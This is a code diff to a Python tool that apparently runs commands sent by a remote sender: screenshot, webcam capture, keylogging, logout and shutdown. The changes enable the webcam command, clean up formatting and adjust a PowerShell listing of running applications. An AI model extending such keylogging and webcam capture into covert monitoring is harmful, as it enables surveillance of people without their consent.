@@ -42,8 +42,8 @@ def capture_SS(file_name: str = "Picture.png") -> str:
 def capture_webcam(file_name: str = "Webcam.png"):
     check_ext(file_name)
     cap = cv2.VideoCapture(0)
-    
-    message:str = ""
+
+    message: str = ""
     path = "Files\\Pictures\\"
 
     if not cap.isOpened():
@@ -56,7 +56,7 @@ def capture_webcam(file_name: str = "Webcam.png"):
     cap.release()
     if not success:
         message = "ERROR: Cannot capture frame"
-        
+
     return path + file_name, message
 
 
@@ -109,7 +109,7 @@ def note2log(sender: str, cmd_list: list) -> str:
 def list_command() -> str:
     content = "The supported commands:"
     content += "\n\t- screenshot [file_name]"
-    content += "\n\t- webcam                        (not available)"
+    content += "\n\t- webcam"
     content += "\n\t- keylog [time in seconds]"
     content += "\n\t- logout"
     content += "\n\t- shutdown [time in seconds]"
@@ -126,7 +126,7 @@ def list_running_application():
     file_path = "Files\\Applications.txt"
 
     powershell_script = """
-    Get-Process | Where-Object {$_.MainWindowHandle -ne 0} | Select-Object Name, MainWindowTitle
+    Get-Process | Where-Object {$_.MainWindowHandle -ne 0} | Select-Object -ExpandProperty Name
     """
 
     try:
@@ -140,6 +140,8 @@ def list_running_application():
 
         # Print the result
         with open(file_path, "w") as f:
+            f.write("Running Applications:\n")
+            f.write("======================\n")
             f.write(result.stdout)
 
     except subprocess.CalledProcessError as e:
